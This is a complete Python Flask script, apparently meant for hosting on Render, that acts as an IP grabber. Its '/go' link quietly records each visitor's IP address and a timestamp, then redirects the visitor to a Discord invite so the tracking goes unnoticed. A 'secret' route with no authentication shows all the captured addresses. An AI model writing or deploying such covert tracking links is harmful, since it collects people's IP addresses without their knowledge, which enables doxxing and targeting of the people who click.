from flask import Flask, request, redirect
from datetime import datetime, timedelta
import os

app = Flask(__name__)

# Function to write to the log file
def log_ip(ip):
    # Render servers use UTC. Adding 8 hours converts it to Philippine Time.
    ph_time = datetime.utcnow() + timedelta(hours=8)
    # Format the time for easier reading (12-hour format with AM/PM)
    timestamp = ph_time.strftime('%Y-%m-%d %I:%M:%S %p')
    
    # Note: 'ips.txt' is deleted every time Render restarts or redeploys
    with open("ips.txt", "a") as f:
        f.write(f"{timestamp} - {ip}\n")

@app.route('/')
def home():
    return "Server is running!"

@app.route('/go')
def track():
    # 1. Look at all possible IP headers used by Render
    headers_to_check = [
        request.headers.get('X-Forwarded-For'),
        request.headers.get('X-Real-IP'),
        request.environ.get('HTTP_X_FORWARDED_FOR'),
        request.remote_addr
    ]
    
    # 2. Find the first one that isn't empty and isn't the Render IP
    final_ip = "Unknown"
    for header in headers_to_check:
        if header:
            # Grab the first IP in the list
            first_ip = header.split(',')[0].strip()
            if first_ip != "209.35.161.157":
                final_ip = first_ip
                break
    
    # 3. If we still only found the Render IP, just use the first header anyway
    if final_ip == "Unknown" and headers_to_check[0]:
        final_ip = headers_to_check[0].split(',')[0].strip()

    log_ip(final_ip)
    return redirect("https://discord.gg/TMKATk684K")

# Secret route to view your logs in the browser
@app.route('/my-secret-logs')
def show_logs():
    if os.path.exists("ips.txt"):
        with open("ips.txt", "r") as f:
            # Using <pre> keeps the formatting clean in the browser
            return f"<pre>{f.read()}</pre>"
    return "No logs captured yet!"

if __name__ == '__main__':
    # Dynamic port binding for Render
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)